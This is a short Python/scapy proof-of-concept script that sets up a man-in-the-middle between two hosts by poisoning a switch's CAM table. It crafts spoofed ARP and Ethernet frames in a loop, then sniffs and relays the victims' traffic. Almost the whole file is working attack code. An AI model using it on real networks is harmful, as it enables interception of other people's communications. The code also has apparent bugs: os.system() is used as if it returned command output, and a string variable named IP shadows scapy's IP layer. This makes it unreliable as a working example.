#!/usr/bin/python

# NAME: switcheroo.py
#
# AUTHOR: Brian Powell and Vikram Kulkarni
#
# DESCRIPTION: switcheroo.py establishes a man-in-the-middle between two 
# targets via switch CAM table poisoning. This script is very proof-of-
# concept: it works only under the very controlled situation in which 
# the victims are communicating exclusively.  Other third party traffic
# breaks the man-in-the-middle.  
#
# USAGE: switcheroo.py <target1> <target2> <interface>
#
#

import os,sys
from scapy.all import *

# Attacker IP and MAC:

IP = "ifconfig | grep -A 1 %s | grep inet | cut -d ':' -f 2 | cut -d ' ' -f 1" % sys.argv[3]
MAC = "ifconfig | grep -A 1 %s | grep HWaddr | cut -d ' ' -f 10" % sys.argv[3]

# Ethernet frame of Attacker

raw1 = Ether()
raw1.type = 0x806
raw1.dst = "ff:ff:ff:ff:ff:ff"  # Broadcast
raw1.src = os.system(MAC) 

# Ethernet frame of one of the spoofees (the other will get the attacker's, repurposed

raw2 = Ether()
raw2.type = 0x806
raw2.dst = "ff:ff:ff:ff:ff:ff"  # Broadcast
raw2.src = os.system(MAC)

# Craft arp requests to targets so that we can learn target MACs.
# arp1 and arp2 do not poison yet...

arp1 = raw1/ARP()

arp1[ARP].hwsrc = raw1.src
arp1[ARP].hwdst = raw1.dst
arp1[ARP].pdst = sys.argv[1]  # Target 1
arp1[ARP].psrc = os.system(IP)  # Attacker IP

arp2 = raw2/ARP()

arp2[ARP].hwsrc = raw1.src
arp2[ARP].hwdst = raw1.dst
arp2[ARP].pdst = sys.argv[2]  # Target 2
arp2[ARP].psrc = os.system(IP)

# Send requests and record Target MACs

rep1 = srp1(arp1)	# expect 1 response from Layer 2
rep2 = srp1(arp2)

# Prepare spoofed ARP requests

raw1.src = rep2.src  # Change source MAC to Target 2 
arp1[ARP].hwsrc = rep2.src
arp1[ARP].psrc = sys.argv[2] # Change source IP to Target 2

raw2.src = rep1.src
arp2[ARP].hwsrc = rep1.src
arp2[ARP].psrc = sys.argv[1]

while True:

  # Spoofed Ethernet frames poison Target 1 and 2 CAM entries

  sendp(raw1)  # No response necessary
  sendp(raw2)

  # Wait until we catch a packet from one of our targets

  traffic = sniff(count=1,filter="dst host %s or dst host %s" % (sys.argv[1], sys.argv[2]))

  
  if traffic[0][IP].dst == sys.argv[1]:   # If the packet is addressed to Target 1...
    # sendp(arp1)  #  Unpoison Target 1/Repoison Target 2
    rep1 = srp1(arp1)
    traffic2= srp1(traffic)  # Send packet along and receive reply
    # sendp(arp2) # Unpoison Target 2/Repoison Target 1
    rep2 = srp1(arp2) 
    sendp(traffic2)  # Send packet along and receive reply. VIK: No reply is neccessary here
  else:
    #sendp(arp2)
    rep2 = srp1(arp2)
    traffic2= srp1(traffic)
    #sendp(arp1)
    rep1 = srp1(arp1)
    sendp(traffic2)

